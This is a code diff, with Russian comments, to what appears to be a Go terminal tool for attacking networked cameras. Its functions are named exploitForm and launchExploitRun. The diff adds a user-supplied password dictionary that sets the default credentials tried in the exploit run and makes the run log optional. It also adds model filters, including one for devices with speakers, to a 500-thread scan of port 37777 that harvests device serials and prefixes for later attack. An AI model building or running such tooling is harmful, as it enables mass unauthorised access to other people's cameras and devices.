@@ -36,6 +36,11 @@ func exploitForm() *formState {
 	// друга (датаграммы роняются, туннели ловят stall). Больше = не
 	// быстрее, проверено: при 20 потоках hit-rate вдвое выше.
 	f.addInt(tr("потоков"), 30)
+	passLabel := tr("словарь паролей (Enter = из настроек)")
+	if cfg.PasswordsFile != "" {
+		passLabel = fmt.Sprintf(tr("словарь паролей (Enter = %s)"), filepath.Base(cfg.PasswordsFile))
+	}
+	f.addStr(passLabel, false, true)
 	f.addBool(tr("снапы?"), cfg.Snaps)
 	f.addBool("autogen .xml?", cfg.XML)
 	return f
@@ -45,8 +50,22 @@ func startExploitRun(m *model) {
 	inFile := m.form.fields[0].strVal
 	outDir := m.form.fields[1].strVal
 	threads := m.threadsVal(2)
-	cfg.Snaps = m.form.fields[3].boolVal
-	cfg.XML = m.form.fields[4].boolVal
+	customPassFile := strings.TrimSpace(m.form.fields[3].strVal)
+	cfg.Snaps = m.form.fields[4].boolVal
+	cfg.XML = m.form.fields[5].boolVal
+
+	if customPassFile != "" {
+		passwords, err := fwd.LoadPasswordsFromFile(customPassFile)
+		if err != nil {
+			showMsg(m, tr("крушим"), red("[-] "+tr("ошибка чтения файла паролей: ")+err.Error()))
+			return
+		}
+		if len(passwords) > 0 {
+			cfg.PasswordsFile = customPassFile
+			cfg.DefaultPasswords = passwords
+			fwd.SetDefaultCreds(cfg.DefaultLogin, passwords)
+		}
+	}
 	saveSettings()
 
 	if msg := ensureDir(outDir); msg != "" {
@@ -137,8 +156,10 @@ func launchExploitRun(m *model, inFile, outDir string, threads int, serials []st
 	// только на форме ввода
 	r := newRunState(runExploit, tr("крушим)"))
 	r.exp = stats
-	// лог прогона — в папку результатов (append между прогонами)
-	r.openLog(filepath.Join(outDir, "log.txt"))
+	// лог прогона — в папку результатов при включенном лог-режиме (append между прогонами)
+	if cfg.Debug {
+		r.openLog(filepath.Join(outDir, "log.txt"))
+	}
 	// Глобальный лимит одновременных P2P-init'ов: oluhradar держит
 	// min(workers,100) хендшейков с одного IP и облако это терпит —
 	// 24 было слишком тесно, очередь пробками вставала.
@@ -189,6 +210,7 @@ func launchExploitRun(m *model, inFile, outDir string, threads int, serials []st
 		CustomTexts: cfg.CustomTexts[:],
 		DummyLogin:  cfg.DummyLogin,
 		DummyPass:   cfg.DummyPass,
+		Logging:     cfg.Debug,
 		Resume:      resume,
 	}
 
@@ -463,6 +485,8 @@ func prefixForm() *formState {
 	f.addInt(tr("порт"), 37777)
 	f.addInt(tr("потоков"), 500)
 	f.addStr(tr("выходной файл (база, без расширения)"), true, false)
+	f.addInt(tr("фильтр: 1=динамики (spkonly.txt), 2=все, 3=свой файл"), 2)
+	f.addStr(tr("файл со своим фильтром (для варианта 3)"), false, false)
 	return f
 }
 
@@ -471,6 +495,50 @@ func startPrefixRun(m *model) {
 	port := m.form.fields[1].intVal
 	threads := m.threadsVal(2)
 	outBase := m.form.fields[3].strVal
+	filterChoice := m.form.fields[4].intVal
+	customFilterFile := m.form.fields[5].strVal
+
+	var filterPatterns []string
+	if filterChoice == 1 {
+		// 1) Только с динамиками (spkonly.txt)
+		spkFile := "spkonly.txt"
+		if data, err := os.ReadFile(spkFile); err == nil {
+			for _, line := range strings.Split(string(data), "\n") {
+				line = strings.TrimSpace(line)
+				if line != "" && !strings.HasPrefix(line, "#") {
+					filterPatterns = append(filterPatterns, strings.ToUpper(line))
+				}
+			}
+		}
+	} else if filterChoice == 3 {
+		// 3) Свой вариант
+		if customFilterFile != "" {
+			if data, err := os.ReadFile(customFilterFile); err == nil {
+				for _, line := range strings.Split(string(data), "\n") {
+					line = strings.TrimSpace(line)
+				if line != "" && !strings.HasPrefix(line, "#") {
+						filterPatterns = append(filterPatterns, strings.ToUpper(line))
+					}
+				}
+			}
+		}
+	}
+
+	matchesFilter := func(model string) bool {
+		if len(filterPatterns) == 0 {
+			return true // вариант 2 (без фильтра)
+		}
+		if model == "" {
+			return false
+		}
+		up := strings.ToUpper(model)
+		for _, pat := range filterPatterns {
+			if strings.Contains(up, pat) {
+				return true
+			}
+		}
+		return false
+	}
 
 	var targets []string
 	if fileExists(tgt) {
@@ -514,6 +582,9 @@ func startPrefixRun(m *model) {
 			atomic.AddInt64(&r.preScanned, 1)
 			sn := ironscan.SanitizeSerial(res.Serial)
 			if sn != "" {
+				if len(filterPatterns) > 0 && !matchesFilter(res.Model) {
+					return
+				}
 				atomic.AddInt64(&r.preFound, 1)
 				mu.Lock()
 				found = append(found, snModel{sn, res.Model})
@@ -553,31 +624,31 @@ func startPrefixRun(m *model) {
 		mu.Unlock()
 		var prefixes []string
 		seenP := make(map[string]struct{})
+		lines := make([]string, 0, len(uniq))
 		for _, e := range uniq {
-			if len(e.sn) < 10 {
+			if len(filterPatterns) > 0 && !matchesFilter(e.model) {
 				continue
 			}
-			p := e.sn[:10]
-			if _, ok := seenP[p]; !ok {
-				seenP[p] = struct{}{}
-				prefixes = append(prefixes, p)
+			if e.model != "" {
+				lines = append(lines, e.sn+";"+e.model)
+			} else {
+				lines = append(lines, e.sn)
 			}
-		}
-		if len(uniq) > 0 {
-			lines := make([]string, 0, len(uniq))
-			for _, e := range uniq {
-				if e.model != "" {
-					lines = append(lines, e.sn+";"+e.model)
-				} else {
-					lines = append(lines, e.sn)
+			if len(e.sn) >= 10 {
+				p := e.sn[:10]
+			if _, ok := seenP[p]; !ok {
+					seenP[p] = struct{}{}
+					prefixes = append(prefixes, p)
 				}
 			}
+		}
+		if len(lines) > 0 {
 			_ = os.WriteFile(outBase+"_serials.txt", []byte(strings.Join(lines, "\n")+"\n"), 0644)
 		}
 		if len(prefixes) > 0 {
 			_ = os.WriteFile(outBase+"_prefix.txt", []byte(strings.Join(prefixes, "\n")+"\n"), 0644)
 			select {
-			case r.eventsCh <- fmt.Sprintf(tr("[+] серийников: %d, префиксов: %d"), len(uniq), len(prefixes)):
+			case r.eventsCh <- fmt.Sprintf(tr("[+] серийников: %d, префиксов: %d"), len(lines), len(prefixes)):
 			default:
 			}
 		}
